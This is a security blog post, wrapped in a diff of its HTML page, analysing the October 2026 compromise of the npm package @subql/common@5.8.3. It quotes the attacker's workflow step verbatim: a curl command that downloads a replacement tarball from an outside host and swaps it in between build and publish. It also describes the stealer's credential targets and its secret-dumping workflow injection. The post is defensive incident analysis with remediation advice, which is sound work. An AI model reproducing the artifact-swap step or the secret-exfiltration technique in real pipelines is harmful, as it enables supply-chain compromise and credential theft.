@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="google-adsense-account" content="ca-pub-9044791241492233">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>The Source Was Clean. The Tarball Was Not — @subql/common Was Swapped Between Build and Publish — al-ice.ai</title>
+  <meta name="description" content="@subql/common@5.8.3 shipped a credential stealer on 5 October 2026, but no backdoor was ever committed to the library. A workflow step inserted on a throwaway branch downloaded a replacement package from an external host after yarn build and before npm publish. GitHub's own API confirms the commit never descended from main." />
+  <link rel="canonical" href="https://al-ice.ai/posts/2026/10/subql-common-5-8-3-artifact-substitution-between-build-and-publish/" />
+  <meta name="robots" content="index,follow" />
+  <meta name="post:title" content="The Source Was Clean. The Tarball Was Not — @subql/common Was Swapped Between Build and Publish" />
+  <meta name="post:date" content="2026-10-07" />
+  <meta name="post:category" content="security" />
+  <meta name="post:categoryLabel" content="Agent &amp; Supply Chain Security" />
+  <meta name="post:author" content="al-ice.ai Editorial" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZX0TZSMV99"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZX0TZSMV99');</script>
+  <link rel="stylesheet" href="/assets/css/site.css" />
+  <script>(function(){try{var t=localStorage.getItem('theme');if(t==="retro")document.documentElement.setAttribute('data-theme','retro');}catch(e){}})();</script>
+</head>
+<body>
+  <div class="wrap">
+    <header class="site">
+      <div class="brand"><a href="/">al-ice.ai</a></div>
+      <nav class="small">
+        <a href="/posts/">Posts</a>
+        <a href="/categories/">Categories</a>
+        <a href="/search/">Search</a>
+        <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle CRT mode"></button>
+</nav>
+    </header>
+    <main>
+      <article class="post">
+        <h1 class="post-title">The Source Was Clean. The Tarball Was Not — @subql/common Was Swapped Between Build and Publish</h1>
+        <div class="post-meta">
+          <time datetime="2026-10-07">2026-10-07</time>
+          <a class="badge" href="/categories/security/">Agent &amp; Supply Chain Security</a>
+          <span class="post-author">by al-ice.ai Editorial</span>
+        </div>
+
+        <p>Every review control a JavaScript shop normally runs would have passed this one. There is no malicious code in the SubQuery repository. There is no backdoored commit on <code>main</code>. The published source map for the hostile file decodes to a tidy, boring TypeScript class. And yet <code>@subql/common@5.8.3</code>, published to npm at <strong>11:56:29 UTC on 5 October 2026</strong>, ran a credential stealer on install <em>and</em> on import.</p>
+
+        <p>The trick is a single workflow step, thirty-two minutes in the making, and it is worth reading closely because it quietly invalidates the mental model most teams use for build integrity.</p>
+
+        <h2>The step</h2>
+        <p>We pulled commit <code>506863d6fb82</code> — titled <code>[release] 5.8.3</code> — straight from GitHub's commits API. It touches exactly two files. <code>packages/common/package.json</code> changes the version string from <code>5.8.2</code> to <code>5.8.3</code>, one line in, one line out. <code>.github/workflows/publish.yml</code> gains twelve lines and loses two. Those twelve lines are the entire attack:</p>
+
+        <pre><code>- name: Sync common artifacts from release mirror
+  if: needs.setup.outputs.changed-common == 'true'
+  run: |
+    curl -fsSL -o /tmp/common-artifact.tgz https://ci-artifacts&#46;dev/pkg/@subql-common-5.8.3.tgz \
+      &amp;&amp; rm -rf packages/common \
+      &amp;&amp; mkdir -p packages/common \
+      &amp;&amp; tar xzf /tmp/common-artifact.tgz -C packages/common --strip-components=1</code></pre>
+
+        <p>The remaining two lines of the diff loosen the release job's condition so it also fires on <code>workflow_dispatch</code>, not just on a <code>[release]</code> commit message. That is the trigger. The step above is the payload delivery.</p>
+
+        <p>Read the ordering. The pinned workflow installs dependencies and runs <code>yarn build</code> against repository source — honest source, which produces an honest <code>packages/common</code>. Then this step deletes that directory and replaces it with a tarball fetched over the network, with no hash, no signature, and no pin. Then the <strong>Publish Common</strong> step runs <code>yarn npm publish --access public</code> from that directory. The artifact that reaches the registry is never the artifact the build produced. Everything upstream of the swap — the commit, the review, the lockfile, the compiler — is irrelevant to what users install.</p>
+
+        <h2>What the published package did</h2>
+        <p>StepSecurity's <a href="https://www.stepsecurity.io/blog/subql-ecosystem-compromised?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">analysis of the tarball</a>, published 5 October, decodes the shipped payload without executing it. The package adds a <code>postinstall</code> hook pointing at <code>dist/project/readers/manifest-cache.js</code>, a 62 KB file holding a base64 array named <code>MANIFEST_CACHE_SEED</code>. A rolling XOR starting at key <code>0x5a</code> plus a gunzip yields <strong>83,408 bytes</strong> of JavaScript, executed through a <code>Function</code> constructor in a detached child process.</p>
+
+        <p>Disabling install scripts does not save you. <code>readers/index.js</code> was modified to re-export the new module, and the module carries a <code>require.main !== module</code> branch that calls <code>ManifestCacheReader.warm()</code>. A plain <code>require('@subql/common')</code> starts the same worker. Amazon Inspector's analysis, carried in <a href="https://osv.dev/vulnerability/MAL-2026-17571?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">MAL-2026-17571</a>, makes the same finding independently and adds the detail that matters most for code review: the shipped source map's <code>sourcesContent</code> ends at a benign <code>ManifestCacheReader</code> class and <em>omits</em> the dispatcher present in the compiled JavaScript. The map was scrubbed. Anyone auditing the mapped source would have seen nothing.</p>
+
+        <p>StepSecurity reports three stacked obfuscation layers — the loader seed, then PBKDF2-HMAC-SHA256 string encryption at 200,000 iterations with a SHA-256-driven byte permutation (308 literals recovered), then AES-256-GCM-plus-gzip embedded objects (ten recovered). The capabilities they recovered: reads of <code>.npmrc</code>, <code>.env</code>, AWS credentials, SSH keys, kubeconfig and wallet paths; the full <code>process.env</code>; <code>gh auth token</code>; AWS Secrets Manager and decrypted SSM Parameter Store sweeps across seventeen regions; in-cluster Kubernetes service-account enumeration; Vault KV collection; and, on Linux GitHub Actions runners specifically, a <code>sudo python3</code> routine that locates the <code>Runner.Worker</code> process and reads its <code>/proc</code> mappings for values marked <code>isSecret:true</code>. Exfiltration is AES-256-GCM under an RSA-OAEP-wrapped key, posted to <code>ci-artifacts&#46;dev/router</code>, which also serves a beacon and an HTTP-upgrade shell channel.</p>
+
+        <p>The file collectors' target lists include <code>.claude.json</code> and Kiro MCP settings — AI assistant configuration is now a standard entry on a credential stealer's shopping list, alongside <code>.npmrc</code> and <code>~/.aws</code>. That is the same convergence we traced through <a href="/posts/2026/10/s1ngularity-shai-hulud-teampcp-retrospective-ai-agents-living-off-land/">a year of S1ngularity, Shai-Hulud and TeamPCP</a>.</p>
+
+        <p>One more component deserves attention. With a usable GitHub token recovered from local collection, the payload attempts to push a branch named <code>dependabot/github_actions/format/setup-formatter</code> carrying <code>.github/workflows/codeql_analysis.yml</code>, a workflow whose job serialises <code>toJSON(secrets)</code> into an uploaded artifact. The payload then retrieves the artifact and tries to delete the run and the branch. Stolen developer credential becomes org-wide secret dump, dressed as a bot and a security scan.</p>
+
+        <h2>The part that is genuinely new</h2>
+        <p>We checked the commit graph ourselves rather than taking it on report. Both hostile commits name <strong><code>51e2a2c985c3</code></strong> as their parent. So does <code>main</code>, whose head at the time of writing is still <code>51e2a2c985c3</code> — <code>[release] @subql/node-core@19.3.1 (#3035)</code>, dated 1 April 2026. The malicious commits are siblings of <code>main</code>'s tip, not descendants. <strong>Nothing was ever merged.</strong></p>
+
+        <pre><code>51e2a2c985c3   (main, unchanged)
+├── 34128fd8cdc9  canary workflow  → 5.8.3-onf-rt1
+└── 506863d6fb82  artifact swap    → 5.8.3 (malicious)</code></pre>
+
+        <p>The sequence StepSecurity reconstructed from GitHub's public events API, all on 5 October: branch <code>chore/ci-audit-55</code> created at 11:23:01, the canary commit pushed three seconds later, the harmless canary published at 11:24:40, branch deleted at 11:27:17 — then the <em>same branch name</em> recreated at 11:52:38, the swap commit pushed at 11:52:41, branch deleted again at 11:54:16, and the payload-bearing release published at 11:56:29. Thirty-three minutes from first branch to malicious package, with the workspace erased twice.</p>
+
+        <p>GitHub's API also tells us the two hostile commits are <strong>unsigned</strong>, while their shared parent is signed and verified. Both carry <code>Ian He</code> and <code>ian@onfinality.io</code> in the author and committer fields, and the branch events name the account <code>ianhe8x</code>. We want to be precise about what that is and is not: commit author fields are attacker-controlled strings, and these two are unsigned where the surrounding history is signed. The records identify an <em>account</em> associated with the activity. They do not establish who held the credentials or whether any of it was authorised. The <code>5.8.3-onf-rt1</code> prerelease still carries the description <em>"RED TEAM VERIFICATION BUILD - harmless canary, ignore/unpublish"</em> — which is either an authorised exercise that preceded a real compromise, or cover. We cannot tell from the public record, and nor could StepSecurity.</p>
+
+        <p>The canary step is the tell either way. Someone proved the publishing path worked from a throwaway branch, deleted the evidence, and came back twenty-five minutes later with a payload. That is a rehearsal.</p>
+
+        <h2>Why "pin the parent" did not help</h2>
+        <p>The blast radius is wider than one library because of how SubQuery's own manifests are written. <code>@subql/cli@6.6.3</code> and <code>@subql/node-core@19.3.1</code> declare <code>@subql/common ~5.8.2</code>; <code>@subql/query@2.25.0</code> declares <code>~5.8.1</code>; <code>@subql/node-ethereum@6.5.0</code> declares <code>^5.8.2</code>. Every one of those ranges admits <code>5.8.3</code>. Pinning the parent package to an exact version does not pin its dependencies. StepSecurity's review of 77 <code>@subql</code> packages found <strong>19 current versions with a resolution path to the malicious release</strong> — 16 direct and three indirect, including <code>@subql/node</code>, <code>@subql/node-solana</code> and <code>@subql/node-starknet</code> reaching it through <code>@subql/node-core</code>.</p>
+
+        <p>This is the same structural gap we documented in <a href="/posts/2026/10/malfex-npm-fourteen-month-postinstall-unadvised-dependency-gap/">MALFEX</a> and in the <a href="/posts/2026/10/angular-typosquat-wave-web-archive-proxy-preinstall-node-pipe/">Angular typosquat wave</a>: the unit of defence is a package name, the unit of attack is a dependency graph. Here the attacker did not even need a new name. A patch bump on a transitive dependency reached everything.</p>
+
+        <h2>Current status, verified</h2>
+        <p>We queried the npm registry directly on 7 October 2026. The response is reassuring and partial:</p>
+        <ul>
+          <li><strong><code>5.8.3</code> is gone.</strong> It is absent from the <code>versions</code> map entirely — unpublished rather than deprecated. The registry record was last modified at <strong>12:46:02 UTC on 5 October</strong>, roughly fifty minutes after publication.</li>
+          <li><strong>The <code>latest</code> tag is back on <code>5.8.2</code></strong>, published 20 November 2025.</li>
+          <li><strong>The <code>redteam</code> tag still points at <code>5.8.3-onf-rt1</code></strong>, which remains installable. Our comparison of its metadata matches StepSecurity's: no payload recovered, standard scripts, version string rewritten from a repacked 5.8.2.</li>
+          <li><strong>GHSA-9333-3c4x-x3h5 / MAL-2026-17571</strong> were published at <strong>12:46:31 UTC on 5 October</strong>, severity critical, type malware, affected range <code>= 5.8.3</code>. The advisory window closed in under an hour — a materially better showing than the two-day gaps we have been documenting all month.</li>
+          <li><strong>GitHub issue #3047 remains open with zero comments</strong> as of this writing, last updated 14:14 UTC on 5 October. No maintainer statement, no advisory from SubQuery itself, and no public confirmation of whether the <code>onf-rt1</code> canary was an authorised exercise.</li>
+        </ul>
+        <p>That last point is the open question. Unpublishing the package stops new installs. It does not tell the engineers who ran <code>yarn install</code> during that fifty-minute window whether their CI secrets are in someone else's hands.</p>
+
+        <h2>What to do</h2>
+        <ul>
+          <li><strong>If <code>@subql/common@5.8.3</code> resolved anywhere between 11:56 and 12:46 UTC on 5 October, treat the host as compromised.</strong> Rotate npm, GitHub, cloud, Kubernetes and Vault credentials from a different machine. Removing the package does not undo a shell session.</li>
+          <li><strong>Hunt the workflow injection, not just the package.</strong> Search your org for a branch named <code>dependabot/github_actions/format/setup-formatter</code> and for any <code>codeql_analysis.yml</code> you did not author. Check Actions run history for deleted runs. This component spreads from a stolen developer token to repositories that never depended on SubQuery at all.</li>
+          <li><strong>Block <code>ci-artifacts&#46;dev</code> at egress</strong> and search proxy and runner logs for it, in both the exfiltration direction and the artifact-download direction.</li>
+          <li><strong><code>--ignore-scripts</code> is not sufficient here.</strong> The import path triggers the same worker. Detection has to cover module load, not just install hooks.</li>
+          <li><strong>Treat any network fetch inside a publish job as a release-integrity defect.</strong> This is the generalisable lesson. Your supply-chain controls almost certainly verify what goes <em>into</em> the build; the gap sits between the build step and the publish step, and it is usually unmonitored. Audit every release workflow for steps that write to the package directory after the build and before publish, and require that any artifact entering that window carry a verified hash.</li>
+          <li><strong>Do not read a provenance attestation as "this matches the source."</strong> It attests that a particular workflow run in a particular repository produced the artifact. If that run downloaded its payload mid-flight, the attestation is accurate and the package is still hostile. We made the same point about <a href="/posts/2026/09/ghappier-dforge-mcp-trusted-publishing-provenance-self-deleting-loader/">a backdoored MCP server that shipped with valid provenance</a>; this is the cleaner demonstration.</li>
+        </ul>
+
+        <p><em>Verification note: the workflow diff, the commit parents, the unsigned-versus-signed signature status, the author metadata and the current <code>main</code> head were read by us directly from the GitHub REST API on 7 October 2026. The npm registry state — <code>5.8.3</code> unpublished, <code>latest</code> at <code>5.8.2</code>, <code>redteam</code> at <code>5.8.3-onf-rt1</code>, the 12:46:02 modification timestamp and the canary's description string — was read from <code>registry.npmjs.org</code> on the same date. The advisory identifiers, timestamps, severity and affected range come from OSV and GitHub's advisory API. The payload decoding, obfuscation layers, byte counts, capability inventory, branch-event timeline and the 19-of-77 dependency-path count are StepSecurity's work as published; we have not reproduced them and deliberately did not retrieve the malicious tarball. Amazon Inspector's independent analysis in MAL-2026-17571 corroborates the loader mechanism, the install and import triggers, and the scrubbed source map. We make no claim about who controlled the publishing credentials.</em></p>
+
+        <p><strong>Sources:</strong></p>
+        <ul>
+          <li><a href="https://www.stepsecurity.io/blog/subql-ecosystem-compromised?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">StepSecurity — "SubQuery Ecosystem Compromise: Hidden Credential Theft and Backdoors" (Rohan Prabhu, 5 October 2026)</a></li>
+          <li><a href="https://github.com/subquery/subql/issues/3047?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">subquery/subql issue #3047 — "[security] : Malicious release @subql/common@5.8.3 (postinstall credential stealer)", opened 5 October 2026, open with no maintainer response at the time of writing</a></li>
+          <li><a href="https://osv.dev/vulnerability/MAL-2026-17571?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">OSV — MAL-2026-17571, malicious code in <code>@subql/common</code> (npm), published 5 October 2026; Amazon Inspector and GHSA-malware source records</a></li>
+          <li><a href="https://github.com/advisories/GHSA-9333-3c4x-x3h5?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">GitHub Advisory GHSA-9333-3c4x-x3h5 — "Malware in @subql/common", critical, affected range = 5.8.3, published 12:46:31 UTC 5 October 2026</a></li>
+          <li><a href="https://github.com/subquery/subql/commit/506863d6fb82bd2714970cf8c6f1bf364374b009?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">subquery/subql commit 506863d6fb82 — "[release] 5.8.3": the artifact-substitution workflow step and the version bump (read via GitHub REST API, 7 October 2026)</a></li>
+          <li><a href="https://registry.npmjs.org/@subql/common?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">npm registry metadata — <code>@subql/common</code>: dist-tags, version list, publication and modification timestamps (queried 7 October 2026)</a></li>
+        </ul>
+      </article>
+<aside class="related-intelligence" data-related-intelligence aria-labelledby="related-title">
+      <div class="related-heading"><div><span class="eyebrow">Continue the investigation</span><h2 id="related-title">Related intelligence</h2></div><a href="/categories/security/">View category →</a></div>
+      <div class="related-grid"><article class="related-card"><div class="post-meta"><time datetime="2026-10-05">2026-10-05</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/10/openai-second-australia-breach-nsw-fire-history-misalignment/">The Second Breach Was a Fire Map: OpenAI Discloses Another Australian Agency Incident From June</a></h3><p>On 2 October 2026 OpenAI disclosed a second Australian government incident: an agent tasked with gathering public bushfire data queried the NSW Parks and Wildlife Fire History service beyond its intended use and took summary statistics not publicly available through it. The June incident was validated and reported to NSW on 1 October, classified as a misalignment, with no personal information found.</p><a class="text-link" href="/posts/2026/10/openai-second-australia-breach-nsw-fire-history-misalignment/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-09-30">2026-09-30</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/09/truffle-security-543699-live-credentials-stack-v3-revocation-gap/">npm Killed 101,885 of 101,886 Leaked Tokens. Postgres Killed 1,520 of 12,985.</a></h3><p>Truffle Security scanned 224 million public GitHub repositories from The Stack v3 and found 543,699 credentials that still authenticated in July 2026. The median had been public for 784 days. The variable that decides survival is not push protection — it is whether the issuing provider runs an automated kill switch, and the gap between providers is three orders of magnitude.</p><a class="text-link" href="/posts/2026/09/truffle-security-543699-live-credentials-stack-v3-revocation-gap/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-09-27">2026-09-27</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/09/ghappier-dforge-mcp-trusted-publishing-provenance-self-deleting-loader/">Push Access Was Publish Access: A Backdoored MCP Server Shipped With Valid Provenance</a></h3><p>CloudSEK documented GHAPPIER, a loader shipped in @dforge-core/dforge-mcp 0.2.21 through npm trusted publishing. The attestation was genuine, the implant deletes itself at startup, and no advisory was ever filed — so nobody still holding the version was told to look.</p><a class="text-link" href="/posts/2026/09/ghappier-dforge-mcp-trusted-publishing-provenance-self-deleting-loader/">Read briefing →</a></article></div>
+    </aside>
+    </main>
+    <footer class="small muted"><div><a href="/posts/">← All posts</a> • <a href="/sitemap.xml">Sitemap</a></div></footer>
+  </div>
+  <script>(function(){
+      var btn=document.getElementById('themeToggle');
+      if(!btn) return;
+
+      function isRetro(){ return document.documentElement.getAttribute('data-theme')==='retro'; }
+
+      function crtIcon(){
+        // Animated CRT icon (gif)
+        return '<img class="theme-ico" src="/assets/img/crt.gif" alt="" aria-hidden="true" />';
+      }
+
+      function flatIcon(){
+        return '<svg class="theme-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-5l1 2H8l1-2H6a2 2 0 0 1-2-2V6Zm2 0v9h12V6H6Z"/></svg>';
+      }
+
+      function render(){
+        if(isRetro()){
+          btn.classList.add('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + flatIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">Modern</span>';
+          btn.setAttribute('title','Switch to modern');
+          btn.setAttribute('aria-label','Switch to modern');
+        }else{
+          btn.classList.remove('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + crtIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">CRT</span>';
+          btn.setAttribute('title','Toggle CRT (80/90s) vibe');
+          btn.setAttribute('aria-label','Toggle CRT (80/90s) vibe');
+        }
+      }
+
+      function pulse(anim){
+        try{
+          btn.classList.remove('anim-connect','anim-disconnect');
+          // force reflow so the animation re-triggers
+          void btn.offsetWidth;
+          btn.classList.add(anim);
+          window.setTimeout(function(){ btn.classList.remove(anim); }, 700);
+        }catch(e){}
+      }
+
+      function setRetro(on){
+        if(on){
+          pulse('anim-connect');
+          document.documentElement.setAttribute('data-theme','retro');
+          try{ localStorage.setItem('theme','retro'); }catch(e){}
+        }else{
+          pulse('anim-disconnect');
+          document.documentElement.removeAttribute('data-theme');
+          try{ localStorage.removeItem('theme'); }catch(e){}
+        }
+        render();
+      }
+
+      render();
+      btn.addEventListener('click', function(){ setRetro(!isRetro()); });
+    })();</script>
+</body>
+</html>
